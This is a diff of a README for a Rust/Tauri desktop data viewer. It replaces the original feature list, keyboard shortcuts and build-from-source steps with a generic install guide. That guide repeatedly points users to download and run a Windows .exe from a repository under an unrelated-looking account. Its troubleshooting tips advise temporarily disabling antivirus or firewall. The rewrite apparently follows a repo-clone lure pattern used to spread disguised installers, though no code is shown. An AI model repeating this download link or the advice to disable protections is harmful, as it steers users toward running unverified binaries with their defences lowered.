@@ -1,147 +1,134 @@
-# ExphoraDB
+# 📊 exphora_db - Explore Data Fast and Simply
 
-A fast, lightweight Rust-powered desktop app for exploring, visually analyzing,
-and sharing your datasets — no cloud required.
+[![Download exphora_db](https://img.shields.io/badge/Download-exphora_db-4caf50?style=for-the-badge&logo=github)](https://github.com/sparoecanthusfultoni104/exphora_db)
 
-![Version](https://img.shields.io/badge/version-v0.8.4-purple)
-![Platform](https://img.shields.io/badge/platform-Windows_11_Pro-lightgrey)
+## 🚀 What is exphora_db?
+
+exphora_db is a desktop app made to help you open and explore structured data files. It works with files like JSON, CSV, SQLite, and XML. The app is lightweight and fast, so it won’t slow your computer down. You can search, filter, export your data, and share your work with others. It runs on Windows and does not require an internet connection to work once installed.
+
+The app uses modern technology under the hood, with Rust, Tauri, and React, but you do not need to know any coding to use it.
+
+## 💻 System Requirements
+
+Before you install exphora_db, check your computer meets these basic needs:
+
+- Operating System: Windows 10 or later (64-bit)
+- CPU: Intel or AMD processor, 2 GHz or faster
+- RAM: 4 GB minimum (8 GB recommended)
+- Disk Space: 200 MB free space
+- Screen: 1280 x 720 resolution or higher
+
+No extra software or programming tools are needed.
+
+## 📂 Supported File Types
+
+exphora_db works with common data formats used in many fields, including:
+
+- JSON files for data exchange  
+- CSV files for spreadsheets and tables  
+- SQLite database files for local data  
+- XML files often used in structured data  
+- Other plain text files with similar format  
+
+This flexibility lets you explore your data regardless of the source.
+
+## 🖥️ How to Download and Install exphora_db on Windows
+
+### 1. Visit the download page
+
+Click the big green button at the top or visit this link:  
+https://github.com/sparoecanthusfultoni104/exphora_db
+
+This page hosts the latest versions available for download.
+
+### 2. Find the Windows Installer
+
+On the download page, look for the section named "Releases" or "Assets."  
+Inside, locate the file that ends with `.exe`. This file is the installer for Windows.
+
+### 3. Download the installer
+
+Click the `.exe` file to download it to your computer. The file size is usually under 100 MB, so it should download quickly on most internet connections.
+
+### 4. Run the installer
+
+Once the download finishes, open the folder where you saved the file. Double-click the `.exe` file to start installation.
+
+- If Windows asks for permission, click “Yes” to allow the installer to make changes.
+- Follow the instructions on the screen.
+- You can accept the default settings for location and components.
+
+### 5. Finish installation and launch exphora_db
+
+When setup is complete, a shortcut will appear on your desktop or in your Start menu.
+
+Click the shortcut to open the app.
+
+## 🔎 How to Use exphora_db To Explore Your Data
+
+### Open your file
+
+- Click the "Open" button or use the menu option "File > Open."
+- Browse to the folder where your data file is saved.
+- Select your JSON, CSV, SQLite, or XML file and click "Open."
+- The app will load your file quickly.
+
+### View and navigate data
+
+- Data will appear in clear tables or structured views.
+- Use column headers to sort data alphabetically or numerically.
+- Scroll vertically and horizontally to see all details.
+
+### Search and filter
+
+- Use the search box to find words or numbers anywhere in your data.
+- Create filters to narrow down the rows shown by choosing criteria like value ranges or keywords.
+
+### Export data
+
+- After filtering, export the results to a new file.
+- Supported export formats include CSV and JSON.
+- This helps when you want to share a smaller part of your data with others.
+
+### Share data peer-to-peer (P2P)
+
+exphora_db supports sharing your filtered datasets directly with trusted people without uploading to the cloud. This keeps your data private and local.
+
+## ⚙️ Settings and Customization
+
+### Appearance
+
+- Choose between light or dark themes to suit your environment.
+- Customize font size for better readability.
+
+### Data Handling
+
+- Set default folder locations for opening and saving files.
+- Configure how large files are loaded for faster performance.
+
+### Backup and Sync
+
+- Enable automatic backup of your work.
+- Use local sync features to keep your data consistent across devices.
+
+## 🛠 Troubleshooting Tips
+
+- If the app does not open, restart your computer and try again.
+- Check your Windows is updated to the latest version.
+- Temporarily disable antivirus or firewall if installation fails (re-enable after).
+- Visit the downloads page again if you suspect the installer did not download fully.
+- Use the “Help” menu inside the app to access user guides and FAQs.
+
+## 📚 Getting More Help
+
+- Explore the repository’s documentation for advanced features.
+- Join the user discussions on GitHub to ask questions or share ideas.
+- Check for app updates regularly on the release page.
+
+[![Download exphora_db](https://img.shields.io/badge/Download-exphora_db-4caf50?style=for-the-badge&logo=github)](https://github.com/sparoecanthusfultoni104/exphora_db)
 
 ---
 
-## What is it?
+## 🏷 Topics
 
-ExphoraDB is a direct alternative to traditional data viewers (Excel, slow SQL interfaces),
-letting you open large datasets in under two seconds and analyze their contents interactively.
-Its philosophy is **local performance** and **sovereign collaboration** via end-to-end
-encrypted P2P sharing — all through a fast, modern UI.
-
----
-
-## Features (v0.8.4)
-
-### Ultra-fast Import ( < 2s )
-- Exphora Views (`.exh`)
-- JSON (`.json`)
-- JSON Lines / NDJSON (`.jsonl`, `.ndjson`)
-- CSV (`.csv`)
-- XML (`.xml`)
-- SQLite (`.db`, `.sqlite`, `.sqlite3`)
-
-### Exploration & Filters
-- Virtualized grid capable of handling millions of rows with instant rendering.
-- Inline cell editing with AutoSave and a global stacked Undo/Redo history (`Ctrl+Z`).
-- Column visibility toggles.
-- Easy / Advanced search mode with regex support and smart highlighting.
-- RelinkModal: reconnects orphaned views by locating the original dataset via SHA-256.
-
-### Calculated Columns (Native Pratt Parser)
-Compute real-time expressions over your rows using the built-in `expr.rs` engine:
-- Full relational operators: `<`, `>`, `<=`, `>=`, `==`, `!=`
-- Row-level logic: `if(condition, true_val, false_val)` *(lazy evaluation)*
-- Math / casting utilities: `round(x, decimals)`, `num(column)`
-- Filtered aggregates: `sum(col)`, `avg(col)`, `countif(condition)` *(operate only over filtered rows)*
-
-### Analytical Dashboard & Visualization
-Lightweight visual analysis that persists per view inside the `.exh` file:
-- Column frequency charts and statistical graphs (Histogram, Bar, Line) via Recharts.
-- Up to 3 widget slots with drag & drop reordering, fullscreen mode, inline title editing,
-  and one-click removal.
-- Brush selector on the X axis for series with more than 15 data points.
-- Mouse-wheel zoom and pan inside any widget (react-zoom-pan-pinch).
-- Dashboard toggle in the TabBar — collapsed by default, session-only state.
-
-### View Format (.exh)
-**The native workspace format.** An `.exh` file is a frozen workspace session that
-encapsulates filters, column config, sorting, calculated columns, dashboard widgets,
-floating Markdown notes, column annotations, and the path to the underlying dataset.
-Retrocompatible across versions.
-
-### Flexible Export
-Export your processed data locally to: CSV, JSON, NDJSON, Markdown, PDF, or paginated Excel.
-
-### Secure P2P
-Send datasets over your local network without touching external servers.
-Bidirectional encryption via `p2pShare` / `p2pFetch`.
-
----
-
-## Quick Start
-
-1. **Open a file**: Press `Ctrl+O` and load any JSON, CSV, SQLite, or XML file.
-2. **Filter data**: Use the top search bar with plain values or regex expressions.
-3. **Calculated column**: Click a column header menu, create a new column, and type
-   e.g. `if(price > 100, "Premium", "Regular")`.
-4. **Dashboard**: Expand the dashboard from the TabBar, add a widget, and explore
-   your data visually. Double-click any widget title to rename it.
-5. **Smart Save**: Press `Ctrl+S` to persist the full workspace state to a `.exh` file.
-6. **Share / Export**: Use `Ctrl+E` to export, or `Ctrl+P` to open the P2P panel.
-
----
-
-## Keyboard Shortcuts
-
-### Files & Tabs
-| Shortcut | Action |
-| :--- | :--- |
-| `Ctrl + O` | Open file dialog |
-| `Ctrl + S` | Smart Save (save current view) |
-| `Ctrl + R` | Reload active dataset |
-| `Ctrl + W` | Close active tab |
-| `Ctrl + Tab` | Next tab |
-| `Ctrl + Shift + Tab` | Previous tab |
-
-### Search & Navigation
-| Shortcut | Action |
-| :--- | :--- |
-| `Ctrl + F` | Focus table search bar |
-| `Tab` / `Shift+Tab` | Navigate focus traps and overlays |
-| `Arrow keys` | Navigate menus and modal grids |
-| `Enter` | Confirm / edit / open context |
-| `Escape` | Close panel, cancel edit, or exit widget fullscreen |
-
-### Table Actions
-| Shortcut | Action |
-| :--- | :--- |
-| `Ctrl + Shift + F` | Column selector — Filter |
-| `Ctrl + Shift + S` | Column selector — Stats |
-| `Ctrl + Shift + G` | Column selector — Frequency chart |
-| `Ctrl + Shift + C` | Clear all active filters |
-| `Ctrl + E` | Export panel |
-| `Double Click` | Inline cell edit |
-| `Ctrl + Z` | Undo inline edit |
-| `Ctrl + X` | Redo inline edit |
-
-### App
-| Shortcut | Action |
-| :--- | :--- |
-| `Ctrl + D` | Toggle dark/light theme |
-| `Ctrl + ,` | Global settings |
-| `Ctrl + P` | P2P collaboration panel |
-
----
-
-## Installation / Build
-
-Requires [Node.js](https://nodejs.org/) and [Rust](https://rustup.rs/) installed.
-
-```bash
-# 1. Install frontend dependencies
-cd ui && npm install
-
-# 2. Run dev server (hot reload)
-cargo tauri dev
-
-# 3. Build production binary (.exe)
-npx @tauri-apps/cli build
-
-# Test
-cargo test
-# 37 passed, 0 failed
-```
-
-## Frontend build
-
-```bash
-cd ui && npm run build
-cargo check
-```
+csv-viewer, data-analysis, data-explorer, desktop-app, json-viewer, local-first, p2p, react, rust, sqlite-viewer, tailwindcss, tauri, typescript, windows, zustand
